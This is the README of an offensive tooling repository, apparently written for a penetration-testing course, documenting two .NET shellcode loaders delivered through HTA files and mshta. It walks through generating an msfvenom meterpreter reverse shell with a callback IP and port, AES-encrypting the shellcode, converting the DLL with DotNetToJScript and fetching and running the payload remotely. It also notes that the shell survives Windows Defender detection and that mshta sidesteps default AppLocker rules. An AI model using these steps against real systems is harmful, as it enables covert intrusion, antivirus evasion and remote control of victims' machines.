# Loaders - PEs

## ToC

| Application | Output | Notes |
| ----------- | ------ | ----- |
| `DLLRunner32` | DLL | Managed DLL that runs AES-Encrypted Shellcode in the loading process (`mshta.exe`). For use in HTA payloads. |
| `DLLInject64` | DLL | Managed DLL that injects AES-Encrypted `msfvenom` Shellcode into a target process. For use in HTA payloads. |


## DLLRunner32

C# source code project that creates a managed (.NET) DLL which contains AES encrypted shellcode. This is designed to be used in an HTA payload that has been crafted with the help of the `DotNetToJScript.exe` binary as taught in the course.

When Initialized, the DLL decrypts the shellcode, allocates RWX memory for it in the process trying to load the DLL, and points execution to it. The DN2JS program and its required DLL is included in this project as well. To construct the desired JavaScript, you can run the following in DLLRunner32 folder:
```bat
DotNetToJScript.exe DLLRunner32_DN2JS.dll --lang=Jscript -c DLLRunner32_DN2JS --ver=v4 -o DLLRunner32_DN2JS.js
```

### Notes

- The JavaScript output is designed to be delivered through an Internet Explorer client visiting the HTA page
  - Because of this, the shellcode and DLL should be 32-bit
- You will have to change the shellcode payload that is hardcoded into the DLL if wanting to use it, see [below instructions](#creating-new-payloads)
  - It uses an msfvenom payload that I created by default, but you can use **any shellcode**! Just run it through the steps below
- Tested on Windows Defender setup:
    ```
    AMEngineVersion                 : 1.1.18400.5
    AMProductVersion                : 4.18.2009.7
    AMRunningMode                   : Normal
    AMServiceEnabled                : True
    AMServiceVersion                : 4.18.2009.7
    AntispywareEnabled              : True
    AntispywareSignatureAge         : 867
    AntispywareSignatureLastUpdated : 8/22/2021 5:28:57 PM
    AntispywareSignatureVersion     : 1.347.247.0
    AntivirusEnabled                : True
    AntivirusSignatureAge           : 867
    AntivirusSignatureLastUpdated   : 8/22/2021 5:28:56 PM
    AntivirusSignatureVersion       : 1.347.247.0
    ```
    - The Windows Defender setup shown above flags the DotNetToJS setup code in the Users's Internet Explorer cache directory, but interestingly enough even if the cached file is deleted, the `mshta.exe` process that the shell is living in isn't killed. So, you get to keep the shell!
 
### Creating New Payloads

1. Create the payload. Example:
    - ```sh
      cd Shellcode-Encryption; msfvenom -a x86 -p windows/meterpreter/reverse_tcp LHOST=192.168.45.241 LPORT=53 -f raw > shellcode.raw
      ```
2. Create the template with `shellcode_encoder.py`. Example:
    - ```sh
      python shellcode_encoder.py -cs ./shellcode.raw blahBlah76 aes
      ```
3. Copy the key and encrypted shellcode into `DLLRunner32_DN2JS.cs`.
    - Keep in mind that the output template won't match up to the DLL code but you're smart enough to figure it out
    - Just copy/paste into the `key` and `buf` variables
4. Build the project
   - The project is integrated into the all-encompassing solution at `OSEP-Tools-v2/payloads/OSEP-Tools-v2.sln` 
    - Select this project, `Build` (it should be preset to x86-Release)
    - Default config will output to this project's `payload_dir/`
5. Create the JavaScript (on Windows). Example:
    - ```bat
      DotNetToJScript.exe DLLRunner32_DN2JS.dll --lang=Jscript -c DLLRunner32_DN2JS --ver=v4 -o DLLRunner32_DN2JS.js
      ```
6. Put into your HTA file
    - If you're debugging, you can add an `alert()` call in the JS's `debug` function


## DLLInject64

A combination of `DLLRunner32` and `clRunner` (in `Loaders_Shellcode`) projects. It injects `msfvenom windows/x64/meterpreter/reverse_tctp` shellcode into the specified 64-bit process.

This is basically the 64-bit brother of `DLLRunner32` that can't be delivered through IE, but is still very useful for bypassing default AppLocker rules. The `mshta.exe` triggering program is in the System32 folder which is whitelisted by default.

### Notes

- This **IS NOT** designed to be delivered through IE like DLLRunner32, rather you're supposed to load it with `mshta.exe`
  - The shellcode and DLL is 64-bit, if triggered through 32-bit IE, it will fail
- You will have to change the IP,PORT, & TGT_PROC arguments see [below instructions](#usage)
- Tested on Windows Defender setup:
    ```
    AMEngineVersion                 : 1.1.18400.5
    AMProductVersion                : 4.18.2009.7
    AMRunningMode                   : Normal
    AMServiceEnabled                : True
    AMServiceVersion                : 4.18.2009.7
    AntispywareEnabled              : True
    AntispywareSignatureAge         : 867
    AntispywareSignatureLastUpdated : 8/22/2021 5:28:57 PM
    AntispywareSignatureVersion     : 1.347.247.0
    AntivirusEnabled                : True
    AntivirusSignatureAge           : 867
    AntivirusSignatureLastUpdated   : 8/22/2021 5:28:56 PM
    AntivirusSignatureVersion       : 1.347.247.0
    ```
    - The Windows Defender setup shown above flags the DotNetToJS setup code in the Users's Internet Explorer cache directory, but interestingly enough even if the cached file is deleted, the `mshta.exe` process that the shell is living in isn't killed. So, you get to keep the shell!

### Usage

1. Change the hardcoded callback IP, Port, and target injection process arguments
    - Easiest way is to just edit the following line towards the bottom of [DLLInject64_DN2JS.js](DLLInject64/payload_dir/DLLInject64_DN2JS.js)
    - ```js
      o.RunProcess("192.168.45.241", "53", "svchost");
      ```
2. Download and run with `mshta`:
   - ```bat
     mshta http://192.168.45.241/tmp/rev/DLLInject64_DN2JS.hta
     ```
